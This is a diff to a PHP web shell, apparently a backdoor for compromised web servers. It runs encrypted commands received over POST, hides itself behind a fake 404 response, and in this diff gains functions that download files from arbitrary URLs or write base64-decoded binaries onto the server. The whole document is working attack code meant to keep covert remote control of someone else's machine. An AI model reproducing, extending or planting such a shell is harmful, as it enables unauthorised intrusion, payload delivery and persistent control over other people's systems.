@@ -11,7 +11,6 @@ if (php_sapi_name() === 'cli') {
 
 $key = '[KEY_HERE]';
 $iv = '[IV_HERE]';
-
 $login = '[LOGIN_HERE]';
 $password = '[PASSWORD_HERE]';
 
@@ -56,30 +55,59 @@ if (isset($_POST['i'])) {
 }
 
 // Return 404 if we don't receive the action
-if (!isset($_POST['c'])) {
+if (!isset($_POST['c']) && !isset($_POST['f'])) {
     header("HTTP/1.1 404 Not Found");
     header_remove("Content-type");
     exit(-1);
 }
 
-// Receiving the command
-$cmd = base64_decode(encrypt_decrypt('decrypt', $_POST['c'], $key, $iv));
 $output = '';
+$path = realpath(base64_decode($_POST['p']));
+if(isset($_POST['c'])){
+    // Receiving the command
+    $cmd = base64_decode(encrypt_decrypt('decrypt', $_POST['c'], $key, $iv));
 
-// If we receive a `cd` command, we need to move ...
-if (substr($cmd, 0, 3) == 'cd ') {
-    $dir = substr($cmd, 3);
-    if ($dir == '~/') {
-        $user = posix_getpwuid(posix_getuid());
-        $dir = $user['dir'];
+    // If we receive a `cd` command, we need to move ...
+    if (substr($cmd, 0, 3) == 'cd ') {
+        $dir = substr($cmd, 3);
+        if ($dir == '~/') {
+            $user = posix_getpwuid(posix_getuid());
+            $dir = $user['dir'];
+        }
+        $dir = realpath($dir);
+        chdir($dir);
+    } else {
+        // Let's run the action
+        if (strlen($cmd) > 0) {
+            chdir($path);
+            $output = execute_command($cmd);
+        }
     }
-    $dir = realpath($dir);
-    chdir($dir);
-} else {
-    // Let's run the action
-    if (strlen($cmd) > 0) {
-        chdir(realpath(base64_decode($_POST['p'])));
-        $output = execute_command($cmd);
+}
+
+if(isset($_POST['f'])) {
+    $files = $_POST['f'];
+    foreach ($files['u'] as $encrypted_url){
+        $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['n'], $key, $iv));
+        $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['p'], $key, $iv));
+        $result = download_file_from_url($payload, $path, $name);
+        if(is_null($result)){
+            $output .= "Permission denied {$path}/{$name}\n";
+        } elseif ($result == false){
+            $output .= "Unable to download the file\n";
+        } else {
+            $output .= $result . "\n";
+        }
+    }
+    foreach ($files['b'] as $encrypted_binary){
+        $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['n'], $key, $iv));
+        $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['p'], $key, $iv));
+        $result = base64_to_file($payload, $path, $name);
+        if(is_null($result)){
+            $output .= "Permission denied {$path}/{$name}\n";
+        } else {
+            $output .= $result . "\n";
+        }
     }
 }
 
@@ -263,5 +291,42 @@ function find_tools(){
     }
 
     return $found;
+}
+
+// Create file from base64
+function base64_to_file($base64_string, $path, $output_file)
+{
+    if(!is_writable($path)){
+        return null;
+    }
+    $complete_path = $path . '/'. $output_file;
+    $handle = fopen($complete_path, "wb");
+    fwrite($handle, base64_decode($base64_string));
+    fclose($handle);
+    return $output_file;
+}
+
+// Download file from URL
+function download_file_from_url($url, $path, $output_file)
+{
+    if(!is_writable($path)){
+        return null;
+    }
+    $complete_path = $path . '/'. $output_file;
+    $options = array(
+        CURLOPT_FILE => is_resource($complete_path) ? $complete_path : fopen($complete_path, 'w'),
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_URL => $url,
+        CURLOPT_FAILONERROR => true,
+    );
+
+    $ch = curl_init();
+    curl_setopt_array($ch, $options);
+    $return = curl_exec($ch);
+
+    if ($return === false) {
+        return false;
+    }
+    return $output_file;
 }
 /* EOF */
